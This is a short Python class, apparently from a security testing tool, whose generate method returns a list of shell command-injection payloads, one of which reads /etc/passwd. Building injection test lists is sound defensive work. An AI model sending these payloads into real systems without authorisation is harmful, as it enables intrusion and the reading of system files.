class CommandInjectionPayloads:
    def generate(self):
        return [
            "; whoami",
            "| id",
            "&& ls -la",
            "`cat /etc/passwd`",
            "$(uname -a)"
        ]